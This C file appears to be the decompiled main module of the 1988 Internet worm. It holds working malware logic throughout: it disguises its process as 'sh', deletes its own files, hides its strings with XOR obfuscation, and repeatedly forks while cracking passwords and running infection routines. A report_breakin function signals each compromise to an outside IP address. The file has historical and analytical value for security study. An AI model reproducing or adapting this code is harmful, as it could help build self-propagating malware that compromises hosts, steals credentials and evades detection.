/* dover */

#include "worm.h"
#include <stdio.h>
#include <signal.h>
#include <strings.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

extern errno;
extern char *malloc();

int pleasequit;					/* See worm.h */
int nobjects = 0;
int nextw;
char *null_auth;

object objects[69];				/* Don't know how many... */

object *getobjectbyname();

char *XS();

main(argc, argv)		/* 0x20a0 */
     int argc;
     char **argv;
{
    int i, l8, pid_arg, j, cur_arg, unused;
    long key;			/* -28(fp) */
    struct rlimit rl;
    
    l8 = 0;					/* Unused */
    
    strcpy(argv[0], XS("sh"));			/* <env+52> */
    time(&key);
    srandom(key);
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    if (setrlimit(RLIMIT_CORE, &rl))
	;
    signal(SIGPIPE, SIG_IGN);
    pid_arg = 0;
    cur_arg = 1;
    if  (argc > 2 &&
	 strcmp(argv[cur_arg], XS("-p")) == 0) { /* env55 == "-p" */
	pid_arg = atoi(argv[2]);
	cur_arg += 2;
    }
    for(i = cur_arg; i < argc; i++) {	/* otherwise <main+286> */
	if (loadobject(argv[i]) == 0)
	    exit(1);
	if (pid_arg)
	    unlink(argv[i]);
    }
    if ((nobjects < 1) || (getobjectbyname(XS("l1.c")) == NULL))
	exit(1);
    if (pid_arg) {
	for(i = 0; i < 32; i++)
	    close(i);
	unlink(argv[0]);
	unlink(XS("sh"));			/* <env+63> */
	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb"
 */
    }
    
    for (i = 1; i < argc; i++)
	for (j = 0;	argv[i][j]; j++)
	    argv[i][j] = '\0';
    if (if_init() == 0)
	exit(1);
    if (pid_arg) {					/* main+600 */
	if (pid_arg == getpgrp(getpid()))
	    setpgrp(getpid(), getpid());
	kill(pid_arg, 9);
    }
    mainloop();
}

static mainloop()				/* 0x2302 */
{
    long key, time1, time0;
    
    time(&key);
    srandom(key);
    time0 = key;
    if (hg() == 0 && hl() == 0)
	ha();
    checkother();
    report_breakin();
    cracksome();
    other_sleep(30);
    while (1) {
	/* Crack some passwords */
	cracksome();
	/* Change my process id */
	if (fork() > 0)
	    exit(0);
	if (hg() == 0 && hi() == 0 && ha() == 0)
	    hl();
	other_sleep(120);
	time(&time1);
	if (time1 - time0 >= 60*60*12)
	    h_clean();
	if (pleasequit && nextw > 0)
	    exit(0);
    }
}

static trans_cnt;
static char trans_buf[NCARGS];

char *XS(str1)			/* 0x23fc */
     char *str1;
{
    int i, len;
    char *newstr;
#ifndef ENCYPHERED_STRINGS
    return str1;
#else  
    len = strlen(str1);
    if (len + 1 > NCARGS - trans_cnt)
	trans_cnt = 0;
    newstr = &trans_buf[trans_cnt];
    trans_cnt += 1 + len;
    for (i = 0; str1[i]; i++)
	newstr[i] = str1[i]^0x81;
    newstr[i] = '\0';
    return newstr;
#endif
}

/* This report a sucessful breakin by sending a single byte to "128.32.137.13"
 * (whoever that is). */

static report_breakin(arg1, arg2)		/* 0x2494 */
{
    int s;
    struct sockaddr_in sin;
    char msg;
    
    if (7 != random() % 15)
	return;
    
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = REPORT_PORT;
    sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
						/* <env+77>"128.32.137.13" */
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return;
    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
	;
    close(s);
}

/* End of first file in the original source.
 * (Indicated by extra zero word in text area.) */

/*
 * Local variables:
 * compile-command: "make"
 * comment-column: 48
 * End:
 */
